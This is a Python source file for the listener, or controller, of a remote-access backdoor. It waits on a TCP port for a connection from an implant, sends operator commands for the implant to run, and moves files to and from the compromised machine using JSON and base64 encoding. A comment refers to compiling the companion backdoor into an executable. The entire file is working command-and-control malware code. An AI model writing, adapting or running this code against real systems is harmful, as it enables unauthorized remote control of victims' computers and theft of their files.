#!/usr/bin/env python3

import json
import socket
import base64

# Before using/compile the Backdoor to exe, make sure to check if the IP address and the Port
# are properly filled in. The same is obligatory for Backdoor file.


class Listener:
    """Creating Listener"""

    def __init__(self):
        """Creating server and waiting for connection"""

        # random port to which we will wait for connection
        home_port = 9500

        home_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # using this option, if we loose the connection
        home_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Receiving the computer name
        computer_name = socket.gethostname()

        # Based on the computer name, we get the IP
        home_ip = socket.gethostbyname(socket.gethostname())

        print("The computer name is:", computer_name)
        print("The computer IP is:", home_ip)

        home_socket.bind((home_ip, home_port))
        home_socket.listen(3)

        print("[-] Waiting for connection...")
        self.new_socket, new_addr = home_socket.accept()
        print(f"Connected with, {new_addr[0]} on port {new_addr[1]}")

    def reliable_send(self, data):
        """
        Send the user's input to the Backdoor
        @param data: user's command
        """

        # packing the data(user's input) into json format, so we can send it.
        # with json we know how big is the packet and when to end the connection
        json_data = json.dumps(data)

        # sending the packed json packing
        # send() function can send only bytes, so we need to encode it
        self.new_socket.send(json_data.encode())

    def reliable_receive(self):
        """Receiving output from the Backdoor"""

        # concat bytes from recv function
        json_data = b""

        while True:
            try:
                # receiving bytes from Backdoor and concat it to one string
                # max buffer 1024
                json_data += self.new_socket.recv(1024)

                # loads() function unpacking the json package
                # it automatically decode the json_data
                return json.loads(json_data)

            # if we receive more than 1024 bytes we receive ValueError
            # when receiving it, continue back to the beginning and concat the result with the previous one
            except ValueError:
                continue

    def execute_remotely(self, command):
        """
        Function to send and receive result to/from backdoor
        @param command: This comes from user's input
        @return: information from backdoor
        """

        # We send encoded(bytes) command to our backdoor
        self.reliable_send(command)

        # we make sure that even with upper/lower case we always exit the program and close the connection
        if command[0].lower() == "exit":
            self.new_socket.close()
            exit()

        return self.reliable_receive()

    def write_file(self, filename, content):
        """
        Using if we want to download a file from our target. This creates a new file on our pc
        @param filename: this is the name of the file we want. It will be the same as the file we download from the target
        @param content: this is the result from the file we download from our target
        @return: Simply return that it was successful executing this command
        """

        # we use 'wb' because our reading function in Backdoor use 'rb'
        # if we transfer file with unknown chars we will receive errors
        # for this purpose we need to use base64 to decode with known chars
        with open(filename, "wb") as file:
            file.write(base64.b64decode(content))

            return "[+] Downloaded the file"

    def read_file(self, filename):
        """
        Using if we want to upload a file from our local pc to the target
        @param filename: file which user want to upload to the target(txt/jpg/etc.)
        @return: returning the content of the file with base64 encode
        """

        # reading the file with 'rb' mode
        # need to use base64 to encode, because we can encounter some unknown chars
        with open(filename, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        """Command to run our listener"""

        while True:
            # Splitting the input in order to operate with more arguments
            # The subprocess function in Backdoor (check_output) can run also with lists
            command = input("Enter command >> ").split()

            try:
                # check if the command is upload
                if command[0] == "upload":

                    # getting the encoded result from the file we want
                    content = self.read_file(command[1])

                    # append the result to our main list in order to be send to the Backdoor
                    # Backdoor will use write function
                    # content need to be decode it, because it is binary
                    command.append(content.decode())

                result = self.execute_remotely(command)

                # checking if the command is 'download'
                if command[0] == "download" and "[-] Error" not in result:
                    # the second argument is the file we want to download
                    # the result we receive is string
                    # because our write function is using 'wb' we need to convert string into binary
                    # so we use encode()
                    result = self.write_file(command[1], result.encode())
            except Exception:
                result = "[-] Error during execution"

            print(result)


my_listener = Listener()
my_listener.run()
